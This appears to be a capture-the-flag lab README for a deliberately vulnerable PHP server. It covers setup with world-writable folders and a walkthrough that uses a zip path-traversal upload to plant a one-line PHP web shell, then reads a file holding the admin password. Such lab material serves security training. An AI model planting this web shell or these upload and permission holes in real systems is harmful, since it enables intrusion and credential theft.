
# Zippo 

Download VM:
* Credentials: ```user/user```, ```root/123456```
* SSH disabled
* Debian 11, 2 GB disk

# Agenda

In your research, you discovered a strange server that, at first glance, only has one page. However, later it turned out that the system administrator uses this server to develop his virtual terminal, which allows him to execute some Linux commands, such as ls, find, wget and others. Well, this is a great chance to try to access the server and look for what else is so interesting there. Maybe we can even find his password?

# Setup

*Requirements:*  **2 GB** of disk space for VM.

Put all files in folder /var/www/html/

```
sudo apt-get update --allow-releaseinfo-change
sudo apt-get install -y nginx php-fpm zip php-zip unzip wget
sudo chown www-data:www-data -R /var/www/html/
sudo chmod 444 -R /var/www/html/*
sudo chmod 777 /var/www/html/wp-content
sudo chmod 777 /var/www/html/admin/upload
sudo chmod 755 /var/www/html/admin
```

Change **/etc/nginx/sites-enabled/default** (php-fpm version may be different):

```
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        root /var/www/html;
        index index.php;
        server_name _;
        location / {
                try_files $uri $uri/ =404;
        }
        location ^~ /admin/upload/ {
        }
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
				# php-fpm version may be different
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Reload nginx

```
sudo  systemctl restart nginx
 ```


## How to check that everything works ?

1. Open main page, you should see stylish 403 page.
2. Navigate **/admin/zip.php**, upload **test.zip** file.  You should see something like:
    ```
    File uploaded
    File: phpinfo.php
    Writing to :/var/www/html/admin/upload/../../wp-content/phpinfo.php
    ```
3. Go to **/wp-content/phpinfo.php**, you shoul see php info page.     

## Solution

1. With dirbuster/dirb/dirsearch find **admin**, **wp-content** and **wp-include** folders 
2. In docs you can find , that there are additional pages may exist.
3. You can bruteforce 2-5 letters of specific page (**/admin/\*\*\*\*\*.php**), user wordlist or gather list of ordinary tools that can be found in /bin directory.
4. You will find **admin/zip.php** file.
5. **upload** folder is not executable, but you can write in **wp-content** folder that is executable.
6. Create **test.php** with next code: 
    ```php
    <?php
    echo "Works!";
    echo shell_exec($_GET['cmd']);
    ?>
    ```
5. User evilarc (https://github.com/ptoomey3/evilarc) to generate zip archieve with path traversal. Put **test.php** in evilarc folder and run next command ```python2.7 evilarc.py -o unix -d 2 -p wp-content test.php```. 
6. You will recieve zip file **evil.zip** with **..\..\wp-content\test.php**
7. Upload it with **/admin/zip.php** and navigate **/wp-content/test.php**. You shoul see "Works!".
8. Use */wp-content/test.php?cmd=**cat /var/www/html/shell.php*** to view shell.php file with admin password.

